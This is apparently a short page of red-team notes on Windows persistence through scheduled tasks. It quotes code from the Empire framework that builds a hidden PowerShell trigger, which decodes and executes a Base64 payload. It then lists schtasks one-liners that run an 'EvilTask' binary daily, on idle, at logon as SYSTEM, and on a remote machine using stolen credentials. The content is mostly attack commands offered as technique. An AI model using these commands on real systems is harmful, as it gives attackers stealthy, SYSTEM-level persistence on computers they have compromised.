<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Schtasks Create A Task</title>
</head><body>Empire userland/persistence and elevated/persistence (more options)<br/>
<br/>
Persist a stager or script using schtasks<br/>
Daily trigger time or User Idle trigger<br/>
Can store the script code in an alternate data stream<br/>
<br/>
Trigger has a max data length<br/>
<br/>
triggerCmd = "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("+locationString+")))\\\"'"<br/>
Warning: trigger command exceeds the maximum of 259 characters<br/>
<br/>
if idleTime != '':<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; script += "schtasks /Create /F /SC ONIDLE /I "+idleTime+" /TN "+taskName+" /TR "+triggerCmd+";"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; statusMsg += " with "+taskName+" idle trigger on " + idleTime + "."<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # otherwise assume we're doing a daily trigger<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; script += "schtasks /Create /F /SC DAILY /ST "+dailyTime+" /TN "+taskName+" /TR "+triggerCmd+";"<br/>
statusMsg += " with "+taskName+" daily trigger at " + dailyTime + "."<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Manually<br/>
# Runs a task daily at 8am.<br/>
schtasks /create /tn "EvilTask" /tr C:\Some\Evil\Task.exe /sc daily /st 08:00<br/>
<br/>
# Runs a task each time the user's session is idle for 5 minutes.<br/>
schtasks /create /tn "EvilTask" /tr C:\Some\Evil\Task.exe /sc onidle /i 5<br/>
<br/>
# Runs a task, as SYSTEM, each time a user logs in.<br/>
schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "EvilTask" /tr C:\Some\Evil\Task.exe /sc onlogon<br/>
<br/>
# Runs a task on a remote machine, as SYSTEM, daily at 8am.<br/>
schtasks /create /s RemoteMachine /u domain\user /p password /ru "NT AUTHORITY\SYSTEM" /rp "" /tn<br/>
"EvilTask" /tr C:\Some\Evil\Task.exe /sc daily /st 08:00</body></html>